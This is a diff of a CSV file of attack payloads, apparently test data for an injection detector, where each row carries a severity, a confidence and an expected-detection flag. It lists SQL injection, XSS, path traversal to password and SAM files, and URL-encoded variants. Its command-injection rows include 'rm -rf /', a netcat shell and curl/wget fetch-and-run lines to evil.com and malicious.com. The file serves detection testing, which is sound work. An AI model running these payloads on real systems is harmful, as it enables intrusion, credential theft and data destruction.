@@ -1,51 +1,71 @@
-id,type,payload,severity,expected_score,description
-sql_1,sql_injection,'; DROP TABLE users; --,high,0.8284604687164323,SQL Injection variant 1
-sql_2,sql_injection,' UNION SELECT * FROM admin --,high,0.8809211004473244,SQL Injection variant 2
-sql_3,sql_injection,' OR '1'='1' --,high,0.9487162946651293,SQL Injection variant 3
-sql_4,sql_injection,"'; INSERT INTO users VALUES ('hacker', 'password'); --",high,0.9705567196413645,SQL Injection variant 4
-sql_5,sql_injection,' AND (SELECT COUNT(*) FROM users) > 0 --,high,0.9027413287022547,SQL Injection variant 5
-sql_6,sql_injection,'; EXEC xp_cmdshell('dir'); --,high,0.8667811588699745,SQL Injection variant 6
-sql_7,sql_injection,"' UNION SELECT username, password FROM users --",high,0.8742005928251944,SQL Injection variant 7
-sql_8,sql_injection,'; UPDATE users SET password='hacked' WHERE id=1; --,high,0.96736291764266,SQL Injection variant 8
-sql_9,sql_injection,' OR 1=1 LIMIT 1 OFFSET 1 --,high,0.9678493420814618,SQL Injection variant 9
-sql_10,sql_injection,'; DELETE FROM logs WHERE date < '2023-01-01'; --,high,0.9569288933077338,SQL Injection variant 10
-xss_1,xss,<script>alert('XSS')</script>,high,0.894718390028035,XSS attack variant 1
-xss_2,xss,<img src=x onerror=alert('XSS')>,high,0.9147854638250588,XSS attack variant 2
-xss_3,xss,javascript:alert('XSS'),high,0.7580110517582861,XSS attack variant 3
-xss_4,xss,<svg onload=alert('XSS')>,high,0.9352717540861123,XSS attack variant 4
-xss_5,xss,<iframe src=javascript:alert('XSS')></iframe>,high,0.7071191607182754,XSS attack variant 5
-xss_6,xss,<body onload=alert('XSS')>,high,0.945422541199087,XSS attack variant 6
-xss_7,xss,<input onfocus=alert('XSS') autofocus>,high,0.7214154483350983,XSS attack variant 7
-xss_8,xss,<select onfocus=alert('XSS') autofocus>,high,0.8125551879734805,XSS attack variant 8
-xss_9,xss,<textarea onfocus=alert('XSS') autofocus>,high,0.8442737526315938,XSS attack variant 9
-xss_10,xss,<keygen onfocus=alert('XSS') autofocus>,high,0.8555880271575264,XSS attack variant 10
-path_1,path_traversal,../../../etc/passwd,medium,0.6922976156051668,Path traversal variant 1
-path_2,path_traversal,..\..\..\windows\system32\config\sam,medium,0.6997084111503865,Path traversal variant 2
-path_3,path_traversal,....//....//....//etc/passwd,medium,0.8067371738184288,Path traversal variant 3
-path_4,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,medium,0.6344541595156825,Path traversal variant 4
-path_5,path_traversal,..%252f..%252f..%252fetc%252fpasswd,medium,0.6543578909057948,Path traversal variant 5
-path_6,path_traversal,..%c0%af..%c0%af..%c0%afetc%c0%afpasswd,medium,0.8545677482334744,Path traversal variant 6
-path_7,path_traversal,..//..//..//etc//passwd,medium,0.6114352063550706,Path traversal variant 7
-path_8,path_traversal,..\..\..\boot.ini,medium,0.6163478341068543,Path traversal variant 8
-path_9,path_traversal,....\....\....\windows\win.ini,medium,0.7149456256996917,Path traversal variant 9
-path_10,path_traversal,%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,medium,0.8646108936611021,Path traversal variant 10
-cmd_1,command_injection,; rm -rf /,critical,0.9456123958496059,Command injection variant 1
-cmd_2,command_injection,| cat /etc/passwd,critical,0.9456026351714178,Command injection variant 2
-cmd_3,command_injection,&& whoami,critical,0.8977910964014777,Command injection variant 3
-cmd_4,command_injection,; ls -la,critical,0.9478682367985483,Command injection variant 4
-cmd_5,command_injection,| nc -l -p 4444 -e /bin/sh,critical,0.8642026182344891,Command injection variant 5
-cmd_6,command_injection,&& curl http://evil.com/shell.sh | sh,critical,0.8838941817194471,Command injection variant 6
-cmd_7,command_injection,; wget http://malware.com/backdoor,critical,0.9940932914810338,Command injection variant 7
-cmd_8,command_injection,"| python -c 'import os; os.system(""rm -rf /"")'",critical,0.9537280771943134,Command injection variant 8
-cmd_9,command_injection,&& echo 'hacked' > /tmp/pwned,critical,0.9210493964492054,Command injection variant 9
-cmd_10,command_injection,; cat /proc/version,critical,0.8915671994296619,Command injection variant 10
-ldap_1,ldap_injection,*)(&(objectClass=*),medium,0.720515555750967,LDAP injection variant 1
-ldap_2,ldap_injection,*)(uid=*))(|(uid=*,medium,0.676686365260184,LDAP injection variant 2
-ldap_3,ldap_injection,admin)(&(password=*)),medium,0.538740735712193,LDAP injection variant 3
-ldap_4,ldap_injection,*))(|(cn=*,medium,0.6030654321802975,LDAP injection variant 4
-ldap_5,ldap_injection,*))%00,medium,0.5648899607501086,LDAP injection variant 5
-ldap_6,ldap_injection,admin*,medium,0.7822643893765004,LDAP injection variant 6
-ldap_7,ldap_injection,*)(|(objectClass=*),medium,0.5490514336111214,LDAP injection variant 7
-ldap_8,ldap_injection,*)(&(|(objectClass=*)(cn=*)),medium,0.5787647606042032,LDAP injection variant 8
-ldap_9,ldap_injection,*)(mail=*))%00,medium,0.7341084598996839,LDAP injection variant 9
-ldap_10,ldap_injection,admin))(|(uid=*,medium,0.5646904901783243,LDAP injection variant 10
+id,category,payload,severity,confidence,expected_detection
+sql_injection_1,SQL Injection,' OR '1'='1,High,0.8102941000569891,True
+sql_injection_2,SQL Injection,'; DROP TABLE users; --,Critical,0.9692632196899741,True
+sql_injection_3,SQL Injection,' UNION SELECT * FROM passwords --,Critical,0.8510369722144426,True
+sql_injection_4,SQL Injection,admin'--,Critical,0.8176909002190506,True
+sql_injection_5,SQL Injection,' OR 1=1 #,Critical,0.9383205205792173,True
+sql_injection_6,SQL Injection,'; EXEC xp_cmdshell('dir'); --,Critical,0.8376464189225437,True
+sql_injection_7,SQL Injection,' AND (SELECT COUNT(*) FROM users) > 0 --,High,0.9596540533558391,True
+sql_injection_8,SQL Injection,' OR SLEEP(5) --,High,0.8119179705746976,True
+sql_injection_9,SQL Injection,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",Critical,0.8897449489574203,True
+sql_injection_10,SQL Injection,' OR '1'='1' /*,Critical,0.8265474294589282,True
+sql_injection_11,SQL Injection,"'; INSERT INTO users VALUES ('hacker', 'password'); --",High,0.8572336553209151,True
+sql_injection_12,SQL Injection,"' UNION ALL SELECT NULL,NULL,NULL,table_name FROM information_schema.tables --",Critical,0.9195652465589659,True
+sql_injection_13,SQL Injection,admin' OR '1'='1' --,High,0.9942063555122035,True
+sql_injection_14,SQL Injection,' OR 1=1 LIMIT 1 --,Critical,0.9934736088728544,True
+sql_injection_15,SQL Injection,'; UPDATE users SET password='hacked' WHERE username='admin'; --,Critical,0.9443186008537646,True
+xss_attack_1,XSS Attack,<script>alert('XSS')</script>,Critical,0.8898257262391509,True
+xss_attack_2,XSS Attack,<img src=x onerror=alert('XSS')>,High,0.8272016417737944,True
+xss_attack_3,XSS Attack,javascript:alert('XSS'),Critical,0.8358009919019115,True
+xss_attack_4,XSS Attack,<svg onload=alert('XSS')>,High,0.9484806565510364,True
+xss_attack_5,XSS Attack,<iframe src=javascript:alert('XSS')></iframe>,Critical,0.8353497226239859,True
+xss_attack_6,XSS Attack,<body onload=alert('XSS')>,High,0.8059227731274601,True
+xss_attack_7,XSS Attack,<input onfocus=alert('XSS') autofocus>,Critical,0.9959700948377006,True
+xss_attack_8,XSS Attack,<select onfocus=alert('XSS') autofocus>,Critical,0.8680924727891116,True
+xss_attack_9,XSS Attack,<textarea onfocus=alert('XSS') autofocus>,High,0.9962821841946412,True
+xss_attack_10,XSS Attack,<keygen onfocus=alert('XSS') autofocus>,High,0.9645528997822557,True
+xss_attack_11,XSS Attack,<video><source onerror=alert('XSS')>,High,0.963650761115295,True
+xss_attack_12,XSS Attack,<audio src=x onerror=alert('XSS')>,Critical,0.8973909295677013,True
+xss_attack_13,XSS Attack,<details open ontoggle=alert('XSS')>,Critical,0.9997126724449987,True
+xss_attack_14,XSS Attack,<marquee onstart=alert('XSS')>,Critical,0.9857779735060361,True
+xss_attack_15,XSS Attack,'-alert('XSS')-',High,0.8011002773735155,True
+path_traversal_1,Path Traversal,../../../etc/passwd,Critical,0.9292889538940465,True
+path_traversal_2,Path Traversal,..\..\..\windows\system32\config\sam,Critical,0.8090982926471463,True
+path_traversal_3,Path Traversal,....//....//....//etc/passwd,High,0.9621559939038936,True
+path_traversal_4,Path Traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,High,0.9620611026788928,True
+path_traversal_5,Path Traversal,..%252f..%252f..%252fetc%252fpasswd,High,0.9866496839432778,True
+path_traversal_6,Path Traversal,..%c0%af..%c0%af..%c0%afetc%c0%afpasswd,Critical,0.9049766634710169,True
+path_traversal_7,Path Traversal,../../../../../../etc/shadow,High,0.8668535421096514,True
+path_traversal_8,Path Traversal,../../../var/log/apache2/access.log,Critical,0.916678500156318,True
+path_traversal_9,Path Traversal,..\..\..\boot.ini,Critical,0.841506177244876,True
+path_traversal_10,Path Traversal,....\\....\\....\\windows\\system32\\drivers\\etc\\hosts,Critical,0.932712630377796,True
+command_injection_1,Command Injection,; ls -la,High,0.9646121967035051,True
+command_injection_2,Command Injection,| cat /etc/passwd,High,0.8462189108742589,True
+command_injection_3,Command Injection,&& whoami,Critical,0.9013220058717681,True
+command_injection_4,Command Injection,; rm -rf /,Critical,0.8294275335371429,True
+command_injection_5,Command Injection,| nc -l -p 4444 -e /bin/sh,Critical,0.9203252066287895,True
+command_injection_6,Command Injection,; curl http://evil.com/shell.sh | sh,Critical,0.8819970357739365,True
+command_injection_7,Command Injection,&& wget http://malicious.com/backdoor.php,High,0.8879767852420631,True
+command_injection_8,Command Injection,"; python -c 'import os; os.system(""id"")'",Critical,0.9240285898309782,True
+command_injection_9,Command Injection,"| perl -e 'system(""id"")'",Critical,0.8854147912403811,True
+command_injection_10,Command Injection,"&& powershell.exe -Command ""Get-Process""",High,0.8265782535797829,True
+encoded_sql_injection_1,Encoded SQL Injection,%27 OR %271%27=%271,High,0.7152478513181694,True
+encoded_sql_injection_2,Encoded SQL Injection,%27; DROP TABLE users; --,Critical,0.8000249529699763,True
+encoded_sql_injection_3,Encoded SQL Injection,%27 UNION SELECT * FROM passwords --,Critical,0.8708768582651717,True
+encoded_sql_injection_4,Encoded SQL Injection,admin%27--,Critical,0.79880157578114,True
+encoded_sql_injection_5,Encoded SQL Injection,%27 OR 1=1 #,Critical,0.894785867937957,True
+encoded_sql_injection_6,Encoded SQL Injection,%27; EXEC xp_cmdshell(%27dir%27); --,Critical,0.7796388373467756,True
+encoded_sql_injection_7,Encoded SQL Injection,%27 AND (SELECT COUNT(*) FROM users) %3E 0 --,High,0.8714505301182822,True
+encoded_sql_injection_8,Encoded SQL Injection,%27 OR SLEEP(5) --,High,0.8301973015265874,True
+encoded_sql_injection_9,Encoded SQL Injection,"1%27 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",Critical,0.8010653994220807,True
+encoded_sql_injection_10,Encoded SQL Injection,%27 OR %271%27=%271%27 /*,Critical,0.7758977607669462,True
+encoded_sql_injection_11,Encoded SQL Injection,"%27; INSERT INTO users VALUES (%27hacker%27, %27password%27); --",High,0.7059044262648043,True
+encoded_sql_injection_12,Encoded SQL Injection,"%27 UNION ALL SELECT NULL,NULL,NULL,table_name FROM information_schema.tables --",Critical,0.7354106698680299,True
+encoded_sql_injection_13,Encoded SQL Injection,admin%27 OR %271%27=%271%27 --,High,0.7091298294274394,True
+encoded_sql_injection_14,Encoded SQL Injection,%27 OR 1=1 LIMIT 1 --,Critical,0.7479537996817268,True
+encoded_sql_injection_15,Encoded SQL Injection,%27; UPDATE users SET password=%27hacked%27 WHERE username=%27admin%27; --,Critical,0.7904548539014356,True
+encoded_xss_attack_1,Encoded XSS Attack,%3Cscript%3Ealert(%27XSS%27)%3C/script%3E,Critical,0.8749613110868717,True
+encoded_xss_attack_2,Encoded XSS Attack,%3Cimg src=x onerror=alert(%27XSS%27)%3E,High,0.74437401803321,True
+encoded_xss_attack_3,Encoded XSS Attack,javascript:alert(%27XSS%27),Critical,0.8184356020579466,True
+encoded_xss_attack_4,Encoded XSS Attack,%3Csvg onload=alert(%27XSS%27)%3E,High,0.7205893472333136,True
+encoded_xss_attack_5,Encoded XSS Attack,%3Ciframe src=javascript:alert(%27XSS%27)%3E%3C/iframe%3E,Critical,0.8754567135830074,True
